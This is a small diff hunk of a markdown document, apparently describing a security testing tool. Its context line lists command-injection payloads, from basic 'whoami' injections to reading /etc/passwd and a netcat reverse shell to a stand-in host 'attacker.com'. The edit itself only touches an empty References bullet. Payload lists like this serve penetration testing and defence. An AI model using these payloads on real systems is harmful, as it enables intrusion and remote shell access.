@@ -35,4 +35,4 @@
 - [S1] "cmd_injection": { "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"], "advanced": ["; cat /etc/passwd", "| nc -e /bin/bash attacker.com 4444", ...] }
 
 ## References
-- 
+-
